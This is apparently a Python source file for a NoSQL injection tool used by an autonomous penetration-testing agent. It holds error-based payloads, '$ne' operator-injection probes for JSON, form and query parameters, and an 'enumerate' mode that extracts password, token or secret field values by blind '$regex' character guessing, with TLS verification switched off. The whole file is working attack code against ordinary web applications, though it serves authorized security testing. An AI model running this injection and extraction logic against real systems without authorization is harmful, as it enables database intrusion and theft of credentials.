"""
run_nosqlmap — self-contained NoSQL (MongoDB-style) injection detector.

Why a built-in engine instead of the classic CLI?
    The original NoSQLMap (codingo/NoSQLMap) is a Python-2, interactive
    menu-driven tool that cannot be reliably driven in batch mode. So this tool
    implements the core MongoDB injection techniques directly over HTTP using
    `requests` (already a project dependency): operator/boolean differential
    injection, error-based injection, and (in enumerate mode) a bounded blind
    `$regex` extraction PoC. That makes detection deterministic and dependency-free
    — it works on a fresh VM with nothing extra installed.

    If the optional Go tool `nosqli` (github.com/Charlie-belmer/nosqli) is on PATH,
    its output is appended as a corroborating second opinion for GET targets, but
    the verdict never depends on it.

Output contract (consumed by AutoPenAgents/agents/nosqli/agent.py::_is_injectable_output):
    On a CONFIRMED injection the report contains one of the phrases that function
    scans for — "is vulnerable", "Injection successful", "[CRITICAL] ... injectable",
    "MongoError", "SyntaxError: Unexpected token", "Database found:", "Mongo version:",
    "Extracted data:". When nothing is confirmed, NONE of those phrases appear, so
    the agent cleanly falls back to manual exploitation.
"""

from __future__ import annotations

import re
import shutil
import string
from typing import Optional
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl

import requests
from pydantic import BaseModel, Field

from tools.base import BaseTool, ToolResult
from execution.runner import run_command

try:  # pentest targets routinely use self-signed / invalid TLS — silence the noise
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
except Exception:
    pass


# A literal value chosen to match no real record — used as the "always-false" control.
_NONMATCH = "nqlZ7x9_no_such_value_qeb"

# Payloads that break a NoSQL/JS query string and surface an engine error.
_ERR_PAYLOADS = ["'\"`{;$", "1');return(true);var _x=('", '"; return true; //', "'||'1'=='1"]

# Substrings that only appear when a payload reached (and upset) the DB / JS engine.
_ERROR_SIGNATURES = [
    "MongoError", "MongoServerError", "MongoParseError", "MongoNetworkError",
    "MongoInvalidArgumentError", "BSONError", "BSONTypeError", "CastError",
    "SyntaxError: Unexpected token", "SyntaxError: Unexpected end",
    "E11000", "failed to parse", "unterminated string literal",
]

# Character set for the bounded blind $regex extraction PoC (enumerate mode).
_ENUM_CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "_-@.!$"
_ENUM_MAX_LEN = 12          # extract at most this many characters
_ENUM_MAX_REQUESTS = 240    # hard cap on requests spent enumerating


class NosqlmapInput(BaseModel):
    url: str = Field(description="Target URL. For GET, include the query string (e.g. https://t/search?q=1).")
    method: str = Field(default="GET", description="HTTP method (GET/POST/PUT/PATCH).")
    data: Optional[str] = Field(
        default=None,
        description="Request body — a JSON object (e.g. {\"username\":\"admin\",\"password\":\"x\"}) or "
                    "form-encoded (a=b&c=d). Its string fields are the injection points.",
    )
    cookie: Optional[str] = Field(default=None, description="Cookie header value for authenticated testing.")
    headers: Optional[list[str]] = Field(default=None, description="Extra headers as 'Key: Value' strings.")
    timeout: int = Field(default=20, description="Per-request HTTP timeout in seconds.")
    enumerate: bool = Field(
        default=False,
        description="After confirmation, attempt a bounded blind $regex extraction of a secret field "
                    "(data-exfiltration PoC). Requires approval — treated as class C.",
    )
    max_requests: int = Field(default=80, description="Hard cap on total HTTP requests for the detection phase.")


# ── HTTP helper ───────────────────────────────────────────────────────────────

class _Http:
    """Thin request sender with a global request-count cap and a stable fingerprint."""

    def __init__(self, headers: Optional[list[str]], cookie: Optional[str], timeout: int, cap: int):
        self.base_headers: dict[str, str] = {}
        for hd in (headers or []):
            if ":" in hd:
                k, v = hd.split(":", 1)
                self.base_headers[k.strip()] = v.strip()
        if cookie:
            self.base_headers["Cookie"] = cookie
        self.timeout = timeout
        self.cap = cap
        self.count = 0

    def send(self, method: str, url: str, json_body=None, form_body=None) -> dict:
        if self.count >= self.cap:
            return {"capped": True}
        self.count += 1
        try:
            resp = requests.request(
                method=method, url=url,
                json=json_body, data=form_body,
                headers=self.base_headers, timeout=self.timeout,
                verify=False, allow_redirects=False,
            )
            body = resp.text or ""
            return {
                "status": resp.status_code,
                "len": len(body),
                "setcookie": bool(resp.headers.get("set-cookie")),
                "location": bool(resp.headers.get("location")),
                "body": body,
            }
        except requests.RequestException as e:
            return {"error": str(e)[:200]}


def _same(a: dict, b: dict) -> bool:
    """True if two responses look like the same behavioural class (status/cookies/redirect/size)."""
    if a.get("capped") or b.get("capped"):
        return True  # no signal available — treat as identical so we never over-claim
    if "error" in a or "error" in b:
        return a.get("error") == b.get("error")
    if a["status"] != b["status"]:
        return False
    if a["setcookie"] != b["setcookie"]:
        return False
    if a["location"] != b["location"]:
        return False
    la, lb = a["len"], b["len"]
    return abs(la - lb) <= max(24, int(0.02 * max(la, lb, 1)))


def _first_signature(body: str, baseline_body: str) -> Optional[str]:
    """Return the first NoSQL engine error signature present in `body` but not in the baseline."""
    for sig in _ERROR_SIGNATURES:
        if sig.lower() in body.lower() and sig.lower() not in baseline_body.lower():
            return sig
    return None


# ── Slot builders — each returns (url, json_body, form_body) for one injection ──

def _make_slot_builders(data: NosqlmapInput):
    """
    Inspect the request and return (mode, base_send_args, slots) where `slots` maps a
    parameter name to a builder(kind, payload) -> (url, json_body, form_body).

    kind is 'literal' (param=value), 'op' (param -> {op: val}), or 'raw' (param=value verbatim).
    """
    method = (data.method or "GET").upper()
    body = (data.data or "").strip()

    # 1) JSON body → inject into its string-valued fields.
    if method in ("POST", "PUT", "PATCH") and body.startswith("{"):
        import json as _json
        try:
            base = _json.loads(body)
        except Exception:
            base = None
        if isinstance(base, dict) and base:
            def make(key):
                def build(kind, payload):
                    b = dict(base)
                    if kind == "op":
                        opname, opval = payload
                        b[key] = {opname: opval}
                    else:  # literal / raw
                        b[key] = payload
                    return (data.url, b, None)
                return build
            keys = [k for k, v in base.items() if isinstance(v, (str, int, float))]
            return "json", (data.url, base, None), {k: make(k) for k in keys}

    # 2) Form-encoded body → inject via bracket notation (qs/Express parse it into objects).
    if method in ("POST", "PUT", "PATCH") and body and "=" in body:
        pairs = parse_qsl(body, keep_blank_values=True)
        if pairs:
            def make(key):
                def build(kind, payload):
                    out = [(k, v) for (k, v) in pairs if k != key]
                    if kind == "op":
                        opname, opval = payload
                        out.append((f"{key}[{opname}]", opval))
                    else:
                        out.append((key, payload))
                    return (data.url, None, out)
                return build
            keys = list(dict.fromkeys(k for k, _ in pairs))
            return "form", (data.url, None, pairs), {k: make(k) for k in keys}

    # 3) Otherwise → inject into query-string parameters via bracket notation.
    p = urlparse(data.url)
    qpairs = parse_qsl(p.query, keep_blank_values=True)
    def make(key):
        def build(kind, payload):
            out = [(k, v) for (k, v) in qpairs if k != key]
            if kind == "op":
                opname, opval = payload
                out.append((f"{key}[{opname}]", opval))
            else:
                out.append((key, payload))
            url2 = urlunparse(p._replace(query=urlencode(out, doseq=True)))
            return (url2, None, None)
        return build
    keys = list(dict.fromkeys(k for k, _ in qpairs))
    return "query", (data.url, None, None), {k: make(k) for k in keys}


# ── Enumerate: bounded blind $regex extraction PoC ────────────────────────────

_SECRET_HINTS = ("password", "passwd", "pass", "pwd", "secret", "token", "apikey", "api_key", "key", "hash")


def _pick_target(keys: list[str], confirmed_key: Optional[str]) -> Optional[str]:
    for k in keys:
        if any(h in k.lower() for h in _SECRET_HINTS):
            return k
    return confirmed_key or (keys[0] if keys else None)


def _enum_extract(http: _Http, method: str, build, ref_true: dict) -> Optional[str]:
    """Extract a field char-by-char with $regex, using ref_true as the 'match' oracle.

    Bounded independently of the detection phase: at most _ENUM_MAX_LEN characters
    and _ENUM_MAX_REQUESTS requests spent here (measured relative to entry).
    """
    start = http.count

    def spent() -> int:
        return http.count - start

    def matches(pattern: str) -> bool:
        url2, jb, fb = build("op", ("$regex", pattern))
        return _same(http.send(method, url2, jb, fb), ref_true)

    # Sanity: the record must exist under the pinned literals — an empty-prefix regex must match.
    if not matches("^"):
        return None

    prefix = ""
    while len(prefix) < _ENUM_MAX_LEN and spent() < _ENUM_MAX_REQUESTS:
        found = False
        for ch in _ENUM_CHARSET:
            if spent() >= _ENUM_MAX_REQUESTS:
                break
            pat = "^" + "".join(re.escape(c) for c in prefix) + re.escape(ch)
            if matches(pat):
                prefix += ch
                found = True
                break
        if not found:
            break
    return prefix or None


# ── Optional external corroboration (Go nosqli, GET only) ─────────────────────

def _external_nosqli(url: str, method: str, timeout: int) -> Optional[str]:
    if method != "GET" or "?" not in url or not shutil.which("nosqli"):
        return None
    try:
        code, out, err = run_command(["nosqli", "scan", "-t", url], timeout=min(timeout * 3, 90))
    except Exception:
        return None
    blob = (out or "") + ("\n" + err if err else "")
    return blob.strip() or None


# ── Tool ──────────────────────────────────────────────────────────────────────

class NoSqlmapTool(BaseTool):
    name = "run_nosqlmap"
    description = (
        "Detect MongoDB-style NoSQL injection with a built-in engine (no external binary): "
        "operator/boolean differential injection, error-based injection, and — in enumerate "
        "mode — a bounded blind $regex data-extraction PoC. Injects into JSON body fields, "
        "form fields, or query parameters depending on the request. Read-only and target-agnostic; "
        "enumerate mode performs data exfiltration and requires approval."
    )
    input_model = NosqlmapInput

    def run(self, data: NosqlmapInput) -> ToolResult:
        method = (data.method or "GET").upper()
        # Detection gets `max_requests`; enumerate mode adds its own separate budget
        # so blind extraction is never starved by the detection phase.
        cap = data.max_requests + (_ENUM_MAX_REQUESTS if data.enumerate else 0)
        http = _Http(data.headers, data.cookie, data.timeout, cap)

        try:
            mode, base_args, slots = _make_slot_builders(data)
        except Exception as e:
            return ToolResult(success=False, output=f"nosqlmap: could not parse request: {e}")

        if not slots:
            return ToolResult(
                success=True,
                output=f"nosqlmap: no injectable parameters found in {data.url} "
                       f"(no query params / body fields to test).",
            )

        base_url, base_json, base_form = base_args
        baseline = http.send(method, base_url, base_json, base_form)
        baseline_body = baseline.get("body", "")

        lines: list[str] = [
            f"nosqlmap (built-in engine) - {method} {data.url}",
            f"Injection surface: {mode}; parameters tested: {', '.join(list(slots)[:8])}",
            "",
        ]

        confirmed_boolean: list[str] = []
        confirmed_error: list[tuple[str, str]] = []
        mongo_version: Optional[str] = None

        for key in list(slots)[:8]:
            if http.count >= http.cap:
                break
            build = slots[key]

            # Error-based: does a query-breaking payload surface a DB engine error?
            for payload in _ERR_PAYLOADS:
                if http.count >= http.cap:
                    break
                url2, jb, fb = build("raw", payload)
                r = http.send(method, url2, jb, fb)
                sig = _first_signature(r.get("body", ""), baseline_body)
                if sig:
                    confirmed_error.append((key, sig))
                    m = re.search(r"MongoDB[^\d]{0,12}(\d+\.\d+(?:\.\d+)?)", r.get("body", ""))
                    if m and not mongo_version:
                        mongo_version = m.group(1)
                    break

            # Boolean/operator: always-true operator must differ from BOTH an
            # always-false operator AND a literal non-match (two independent controls
            # → strong signal, low false-positive rate).
            control = http.send(method, *_unpack(build("literal", _NONMATCH)))
            op_true = http.send(method, *_unpack(build("op", ("$ne", _NONMATCH))))
            op_false = http.send(method, *_unpack(build("op", ("$eq", _NONMATCH))))
            if (not _same(op_true, op_false)) and (not _same(op_true, control)):
                confirmed_boolean.append(key)

        # ── Verdict ────────────────────────────────────────────────────────────
        injectable = bool(confirmed_boolean or confirmed_error)

        for key, sig in confirmed_error:
            lines.append(
                f"[CRITICAL] Parameter '{key}' is vulnerable (injectable) — a query-breaking payload "
                f"surfaced a NoSQL engine error: {sig}. Injection successful (error-based)."
            )
        for key in confirmed_boolean:
            lines.append(
                f"[CRITICAL] Parameter '{key}' is vulnerable (injectable) to NoSQL operator injection "
                f"(boolean-based): an always-true {{'$ne': ...}} operator returned a response class "
                f"distinct from both a literal non-match and an always-false operator. Injection successful."
            )

        if injectable:
            lines.insert(3, "Database found: MongoDB-style (operator injection interpreted server-side).")
            if mongo_version:
                lines.insert(4, f"Mongo version: {mongo_version}")

            # ── enumerate: bounded blind $regex extraction PoC ──
            if data.enumerate:
                target = _pick_target(list(slots), confirmed_boolean[0] if confirmed_boolean else None)
                if target:
                    build = slots[target]
                    ref_true = http.send(method, *_unpack(build("op", ("$ne", _NONMATCH))))
                    ref_false = http.send(method, *_unpack(build("op", ("$eq", _NONMATCH))))
                    if not _same(ref_true, ref_false):
                        value = _enum_extract(http, method, build, ref_true)
                        if value:
                            lines.append(
                                f"Extracted data: {target} begins with \"{value}\" "
                                f"(bounded blind $regex PoC, <= {_ENUM_MAX_LEN} chars)."
                            )
                        else:
                            lines.append(
                                f"Extracted data: injection confirmed on '{target}' but no unique "
                                f"record oracle was available for blind extraction."
                            )
                    else:
                        lines.append(
                            "Extracted data: no stable boolean oracle for blind extraction "
                            "(pinned-field record not uniquely identifiable)."
                        )
        else:
            lines.append(
                f"No NoSQL injection confirmed on {min(len(slots), 8)} parameter(s) tested "
                f"({http.count} requests). Recommend manual operator/$regex probing."
            )

        # Optional external corroboration (never changes the verdict).
        ext = _external_nosqli(data.url, method, data.timeout)
        if ext:
            lines += ["", "-- corroboration: Go nosqli scan --", ext[:1500]]

        return ToolResult(success=True, output="\n".join(lines))


def _unpack(triple):
    """(url, json_body, form_body) -> args for _Http.send(method, url, json_body, form_body)."""
    url, jb, fb = triple
    return url, jb, fb
